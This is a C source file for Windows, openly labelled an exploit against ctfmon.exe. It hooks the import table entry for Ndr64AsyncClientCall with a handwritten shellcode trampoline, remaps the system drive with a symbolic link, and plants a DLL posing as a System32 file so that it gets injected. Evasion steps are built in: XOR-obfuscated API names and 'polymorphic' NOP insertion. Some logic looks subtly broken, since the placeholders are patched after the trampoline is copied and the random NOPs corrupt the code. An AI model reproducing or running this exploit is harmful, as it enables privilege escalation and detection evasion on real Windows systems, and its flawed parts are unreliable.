#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <dbghelp.h>

// Link with DbgHelp.lib for ImageDirectoryEntryToData
#pragma comment(lib, "Dbghelp.lib")

// Define the function pointer for NtCreateSymbolicLinkObject
typedef NTSTATUS (NTAPI *NtCreateSymbolicLinkObject_t)(
    PHANDLE            LinkHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PUNICODE_STRING    TargetName
);

// Define the function pointer for RtlInitUnicodeString
typedef VOID (NTAPI *RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);

// XOR encode/decode function
void xor_encode(char* data, size_t length, char key) {
    for (size_t i = 0; i < length; ++i) {
        data[i] ^= key;
    }
}

// Wrapper function to resolve NtCreateSymbolicLinkObject dynamically
NtCreateSymbolicLinkObject_t resolve_NtCreateSymbolicLinkObject() {
    // Encoded string for "NtCreateSymbolicLinkObject"
    char encoded_func[] = { 
        'N'^0xAA, 't'^0xAA, 'C'^0xAA, 'r'^0xAA, 'e'^0xAA, 'a'^0xAA, 't'^0xAA, 'e'^0xAA,
        'S'^0xAA, 'y'^0xAA, 'm'^0xAA, 'b'^0xAA, 'o'^0xAA, 'l'^0xAA, 'i'^0xAA,
        'c'^0xAA, 'L'^0xAA, 'i'^0xAA, 'n'^0xAA, 'k'^0xAA, 'O'^0xAA, 'b'^0xAA,
        'j'^0xAA, 'e'^0xAA, 'c'^0xAA, 't'^0xAA, '\0' 
    };
    size_t len = sizeof(encoded_func);
    
    // Create a buffer to decode the string without modifying the original
    char decoded_func[sizeof(encoded_func)];
    memcpy(decoded_func, encoded_func, sizeof(encoded_func));
    
    // Decode
    xor_encode(decoded_func, len, 0xAA);
    
    // Ensure null termination
    decoded_func[len - 1] = '\0';
    
    // Debug: Display the decoded string
    printf("[DEBUG] Decoded NtCreateSymbolicLinkObject: %s\n", decoded_func);
    
    // Get handle to ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] Failed to get handle to ntdll.dll: %lu\n", GetLastError());
        return NULL;
    }
    printf("[DEBUG] ntdll.dll handle: %p\n", (void*)ntdll);
    
    // Resolve the API dynamically
    NtCreateSymbolicLinkObject_t NtCreateSymLink = 
        (NtCreateSymbolicLinkObject_t)GetProcAddress(ntdll, decoded_func);
    
    if (!NtCreateSymLink) {
        printf("[-] Failed to resolve NtCreateSymbolicLinkObject\n");
    }
    
    // Re-encode to avoid detection after resolution
    xor_encode(decoded_func, len, 0xAA);
    
    return NtCreateSymLink;
}

// Wrapper function to resolve RtlInitUnicodeString dynamically
RtlInitUnicodeString_t resolve_RtlInitUnicodeString() {
    // Encoded string for "RtlInitUnicodeString"
    char encoded_func[] = { 
        'R'^0xAA, 't'^0xAA, 'l'^0xAA, 'I'^0xAA, 'n'^0xAA, 'i'^0xAA, 't'^0xAA,
        'U'^0xAA, 'n'^0xAA, 'i'^0xAA, 'c'^0xAA, 'o'^0xAA, 'd'^0xAA, 'e'^0xAA,
        'S'^0xAA, 't'^0xAA, 'r'^0xAA, 'i'^0xAA, 'n'^0xAA, 'g'^0xAA, '\0' 
    };
    size_t len = sizeof(encoded_func);
    
    // Create a buffer to decode the string without modifying the original
    char decoded_func[sizeof(encoded_func)];
    memcpy(decoded_func, encoded_func, sizeof(encoded_func));
    
    // Decode
    xor_encode(decoded_func, len, 0xAA);
    
    // Ensure null termination
    decoded_func[len - 1] = '\0';
    
    // Debug: Display the decoded string
    printf("[DEBUG] Decoded RtlInitUnicodeString: %s\n", decoded_func);
    
    // Get handle to ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] Failed to get handle to ntdll.dll: %lu\n", GetLastError());
        return NULL;
    }
    printf("[DEBUG] ntdll.dll handle: %p\n", (void*)ntdll);
    
    // Resolve the API dynamically
    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = 
        (RtlInitUnicodeString_t)GetProcAddress(ntdll, decoded_func);
    
    if (!RtlInitUnicodeString_ptr) {
        printf("[-] Failed to resolve RtlInitUnicodeString\n");
    }
    
    // Re-encode to avoid detection after resolution
    xor_encode(decoded_func, len, 0xAA);
    
    return RtlInitUnicodeString_ptr;
}

// Global declarations
UNICODE_STRING s;
HANDLE h;

// Function to get the current DOS device path
void get_current_dos_device(int size, char *current_device_path) {
    char current_directory[0x100];
    char current_volume[0x100];
    char current_dos_device[0x100];
    char final_path[0x200];

    // Get current directory
    if (GetCurrentDirectoryA(sizeof(current_directory), current_directory) == 0) {
        fprintf(stderr, "GetCurrentDirectory failed with error: %lu\n", GetLastError());
        return;
    }

    // Get current volume (e.g., "C:")
    strncpy_s(current_volume, sizeof(current_volume), current_directory, 2);
    current_volume[2] = '\0';

    // Get current device
    if (QueryDosDeviceA(current_volume, current_dos_device, sizeof(current_dos_device)) == 0) {
        fprintf(stderr, "QueryDosDeviceA failed with error: %lu\n", GetLastError());
        return;
    }

    // Build final path
    strncpy_s(final_path, sizeof(final_path), current_dos_device, sizeof(final_path) - 1);
    strncat_s(final_path, sizeof(final_path), current_directory + 2, sizeof(final_path) - strlen(final_path) - 1);

    // Return the device path name
    strncpy_s(current_device_path, size, final_path, size - 1);
    current_device_path[size - 1] = '\0';
}

// Function to convert ASCII to Unicode
void ascii_to_unicode(char *ascii, wchar_t *unicode) {
    size_t len = strlen(ascii) + 1;
    for (size_t i = 0; i < len; i++) {
        unicode[i] = (wchar_t)ascii[i];
    }
}

// Function to find the IAT entry for a given function
void* find_iat_entry(const char* moduleName, const char* functionName) {
    HMODULE hModule = GetModuleHandleA(NULL);
    if (!hModule) {
        printf("Main module not loaded.\n");
        return NULL;
    }

    ULONG size;
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(
        hModule, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size);
    if (!importDesc) {
        printf("No import directory found in main module.\n");
        return NULL;
    }

    while (importDesc->Name) {
        const char* importModule = (const char*)((BYTE*)hModule + importDesc->Name);
        if (_stricmp(importModule, "rpcrt4.dll") == 0) { // Target DLL
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + importDesc->FirstThunk);
            while (thunk->u1.Function) {
                FARPROC* func = (FARPROC*)&thunk->u1.Function;
                FARPROC targetFunc = GetProcAddress(GetModuleHandleA("rpcrt4.dll"), functionName);
                if (*func == targetFunc) {
                    return func;
                }
                thunk++;
            }
        }
        importDesc++;
    }
    return NULL;
}


// Function to replace placeholders in the trampoline
int replace_trampoline_value(char *shellcode, unsigned int size, unsigned __int64 original_value, unsigned __int64 value) {
    for (unsigned int pos = 0; pos < (size - sizeof(unsigned __int64)); pos += sizeof(unsigned __int64)) {
        if (*(unsigned __int64*)(shellcode + pos) == original_value) {
            *(unsigned __int64*)(shellcode + pos) = value;
            return 1; // Success
        }
    }
    return 0; // Failure
}

// Function to generate a polymorphic trampoline
void generate_polymorphic_trampoline(char *trampoline, size_t size, char key) {
    // XOR encode
    xor_encode(trampoline, size, key);

    // Add random NOPs for polymorphism
    for (size_t i = 0; i < size; ++i) {
        if (rand() % 10 < 2) { // 20% chance
            trampoline[i] = 0x90; // NOP
        }
    }

    // Decode before use
    xor_encode(trampoline, size, key);
}

// Function to execute custom code (remapping system drive)
void remap_system_drive(void) {
    Sleep(1000); // Wait for "ctfmon.exe" to appear

    // Resolve RtlInitUnicodeString dynamically
    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = resolve_RtlInitUnicodeString();
    if (!RtlInitUnicodeString_ptr) {
        fprintf(stderr, "Failed to resolve RtlInitUnicodeString\n");
        return;
    }

    // Initialize UNICODE_STRING for the target
    wchar_t targetPath[] = L"\\??\\C:\\NewSymbolicLink";
    RtlInitUnicodeString_ptr(&s, targetPath);

    // Initialize OBJECT_ATTRIBUTES using the provided macro
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &s, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Create the symbolic link
    NtCreateSymbolicLinkObject_t NtCreateSymLink = resolve_NtCreateSymbolicLinkObject();
    if (!NtCreateSymLink) {
        fprintf(stderr, "Failed to resolve NtCreateSymbolicLinkObject\n");
        return;
    }

    NTSTATUS status = NtCreateSymLink(&h, 0xF0001, &objAttr, &s);
    if (status == 0) { // STATUS_SUCCESS
        printf("[+] Symbolic Link Created: Handle : %p\n", (void*)h);
    } else {
        fprintf(stderr, "NtCreateSymbolicLinkObject failed with status: 0x%X\n", status);
    }
}

int main() {
    // Declarations and initializations
    char buffer[0x100];
    char current_dos_device[0x100];
    wchar_t current_dos_device_w[0x200];
    char system_directory[0x100];
    char drive_to_remap[16];
    char device_to_remap[16];
    wchar_t device_to_remap_w[16];
    void **Ndr64AsyncClientCall_IAT;
    void *Ndr64AsyncClientCall;
    void *hook;
    unsigned __int64 RBX;
    UNICODE_STRING drive;
    HANDLE event;
    DWORD oldProtect;
    int ret;

    // Create an event object
    event = CreateEventA(NULL, FALSE, FALSE, "ctfmon_owned");
    if (!event) {
        fprintf(stderr, "CreateEvent failed with error: %lu\n", GetLastError());
        return 1;
    }

    // Allocate memory for the trampoline
    hook = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!hook) {
        fprintf(stderr, "VirtualAlloc failed with error: %lu\n", GetLastError());
        return 1;
    }
    memset(hook, 0, 0x1000);

    // Trampoline with encoded placeholders
    char trampoline[] =
    {
        // Save RBX
        0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,  // mov rax,0x1111111111111111
        0x48, 0x89, 0x18,                                            // mov [rax],rbx

        // Redirect to original function
        0x5B,                                                        // pop rbx
        0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,  // mov rax,0x2222222222222222
        0xFF, 0xD0,                                                  // call rax
        0x53,                                                        // push rbx
        0x50,                                                        // push rax

        // Save all registers (excluding RSP to maintain stack integrity)
        0x41, 0x57, // push r15
        0x41, 0x56, // push r14
        0x41, 0x55, // push r13
        0x41, 0x54, // push r12
        0x41, 0x53, // push r11
        0x41, 0x52, // push r10
        0x41, 0x51, // push r9
        0x41, 0x50, // push r8
        0x55,       // push rbp
        0x57,       // push rdi
        0x56,       // push rsi
        0x52,       // push rdx
        0x51,       // push rcx
        0x53,       // push rbx
        0x50,       // push rax

        // Execute custom code
        0x48, 0xB8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,  // mov rax,0x3333333333333333
        0xFF, 0xD0,                                                  // call rax

        // Restore all registers
        0x58,       // pop rax
        0x5B,       // pop rbx
        0x59,       // pop rcx
        0x5A,       // pop rdx
        0x5E,       // pop rsi
        0x5F,       // pop rdi
        0x5D,       // pop rbp
        0x41, 0x58, // pop r8
        0x41, 0x59, // pop r9
        0x41, 0x5A, // pop r10
        0x41, 0x5B, // pop r11
        0x41, 0x5C, // pop r12
        0x41, 0x5D, // pop r13
        0x41, 0x5E, // pop r14
        0x41, 0x5F, // pop r15

        // Restore RBX
        0x48, 0xB8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44,  // mov rax,0x4444444444444444
        0x48, 0x8B, 0x18,                                            // mov rbx,[rax]
        0x58,                                                        // pop rax
        0xC3,                                                        // ret
    };
    size_t trampoline_size = sizeof(trampoline);

    // Generate the polymorphic trampoline
    generate_polymorphic_trampoline(trampoline, trampoline_size, 0xAA);

    // Copy the trampoline into the hook memory
    memcpy(hook, trampoline, trampoline_size);

    // Change memory protection to PAGE_EXECUTE_READ
    if (!VirtualProtect(hook, 0x1000, PAGE_EXECUTE_READ, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed with error: %lu\n", GetLastError());
        VirtualFree(hook, 0, MEM_RELEASE);
        return 1;
    }

    // Get the current DOS device path
    get_current_dos_device(sizeof(current_dos_device), current_dos_device);
    printf("[+] Current Path: %s\n", current_dos_device);

    // Convert to Unicode
    ascii_to_unicode(current_dos_device, current_dos_device_w);

    // Initialize UNICODE_STRING for OBJECT_ATTRIBUTES
    RtlInitUnicodeString_t RtlInitUnicodeString_ptr = resolve_RtlInitUnicodeString();
    if (!RtlInitUnicodeString_ptr) {
        fprintf(stderr, "Failed to resolve RtlInitUnicodeString\n");
        return 1;
    }
    RtlInitUnicodeString_ptr(&s, (wchar_t*)current_dos_device_w);

    // Get the system directory
    GetSystemDirectoryA(system_directory, sizeof(system_directory));

    // Get the drive to remap (e.g., "C:")
    strncpy_s(drive_to_remap, sizeof(drive_to_remap), system_directory, 2);
    drive_to_remap[2] = '\0';

    // Get the device to remap (e.g., "\\??\\C:")
    sprintf_s(device_to_remap, sizeof(device_to_remap), "\\??\\%s", drive_to_remap);

    // Convert to Unicode
    ascii_to_unicode(device_to_remap, device_to_remap_w);

    // Initialize UNICODE_STRING for the drive
    RtlInitUnicodeString_ptr(&drive, (wchar_t*)device_to_remap_w);

    // Initialize OBJECT_ATTRIBUTES
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &drive, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Initialize the buffer (SecurityDescriptor)
    memset(buffer, 0, sizeof(buffer));
    *((unsigned __int64*)(buffer + 0x00)) = 0xc0001; // Example flags, adjust if necessary

    // Execute ctfmon.exe to initialize DLLs
    ShellExecuteA(NULL, "open", "ctfmon.exe", "", NULL, SW_SHOW);

    // Get the address of Ndr64AsyncClientCall
    Ndr64AsyncClientCall = GetProcAddress(GetModuleHandleA("rpcrt4.dll"), "Ndr64AsyncClientCall");
    if (!Ndr64AsyncClientCall) {
        fprintf(stderr, "Failed to obtain Ndr64AsyncClientCall: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Ndr64AsyncClientCall: %p\n", (void*)Ndr64AsyncClientCall);

    // Find the IAT entry in "rpcrt4.dll"
    Ndr64AsyncClientCall_IAT = (void**)find_iat_entry("rpcrt4.dll", "Ndr64AsyncClientCall");
    if (!Ndr64AsyncClientCall_IAT) {
        fprintf(stderr, "Failed to locate IAT entry for Ndr64AsyncClientCall.\n");
        return 1;
    }
    printf("[+] Ndr64AsyncClientCall_IAT: %p\n", (void*)Ndr64AsyncClientCall_IAT);

    // Replace placeholders in the trampoline
    if (!replace_trampoline_value(trampoline, trampoline_size, 0x1111111111111111, (unsigned __int64)&RBX)) {
        printf("[-] Failed to replace 0x1111111111111111 in the trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, trampoline_size, 0x2222222222222222, (unsigned __int64)Ndr64AsyncClientCall)) {
        printf("[-] Failed to replace 0x2222222222222222 in the trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, trampoline_size, 0x3333333333333333, (unsigned __int64)remap_system_drive)) {
        printf("[-] Failed to replace 0x3333333333333333 in the trampoline.\n");
    }
    if (!replace_trampoline_value(trampoline, trampoline_size, 0x4444444444444444, (unsigned __int64)&RBX)) {
        printf("[-] Failed to replace 0x4444444444444444 in the trampoline.\n");
    }

    // Validate the trampoline
    for (unsigned int i = 0; i < trampoline_size; i += sizeof(unsigned __int64)) {
        unsigned __int64 val = *(unsigned __int64*)(trampoline + i);
        if (val == 0x1111111111111111 || val == 0x2222222222222222 ||
            val == 0x3333333333333333 || val == 0x4444444444444444) {
            printf("[-] Placeholder 0x%llx not replaced at offset 0x%X\n", val, i);
        }
    }

    // Hook the IAT entry
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed when unprotecting the IAT: %lu\n", GetLastError());
        return 1;
    }
    *Ndr64AsyncClientCall_IAT = hook;
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), oldProtect, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed when restoring IAT protection: %lu\n", GetLastError());
        return 1;
    }

    // User message
    printf("[+] Launching the exploit...\n");

    // Create directories
    char dll_source[] = ".\\MsCtfMonitor.dll";
    char dll_destination[] = ".\\windows\\system32\\systemhook.dll";

    if (CreateDirectoryA(".\\windows", NULL) == TRUE || GetLastError() == ERROR_ALREADY_EXISTS) {
        // Create the System32 subdirectory
        CreateDirectoryA(".\\windows\\system32", NULL);
    } else {
        printf("[-] Error: The exploit lacks permissions to create a directory.\n");
        return 1;
    }

    // Copy the DLL with a neutral name
    if (CopyFileA(dll_source, dll_destination, FALSE) == FALSE) {
        printf("[-] Error copying 'MsCtfMonitor.dll' to '.\\windows\\system32\\systemhook.dll'\n");
        return 1;
    }

    // Execute the target program
    ShellExecuteA(NULL, "open", "ctfmon.exe", "/?", NULL, SW_SHOW);

    // Wait for the DLL injection
    printf("[+] Waiting for DLL injection...\n");
    ret = WaitForSingleObject(event, 10000);
    if (ret != WAIT_OBJECT_0) {
        printf("[-] WaitForSingleObject timed out or failed.\n");
    }

    // Close the handle for remapping "C:"
    CloseHandle(h);

    // Unhook the IAT entry
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), PAGE_READWRITE, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed when unprotecting the IAT for unhooking: %lu\n", GetLastError());
        return 1;
    }
    *Ndr64AsyncClientCall_IAT = Ndr64AsyncClientCall;
    if (!VirtualProtect(Ndr64AsyncClientCall_IAT, sizeof(void*), oldProtect, &oldProtect)) {
        fprintf(stderr, "VirtualProtect failed when restoring IAT protection after unhooking: %lu\n", GetLastError());
        return 1;
    }

    // Final message
    printf("[+] Exploit succeeded!\n");
    return 0;
}
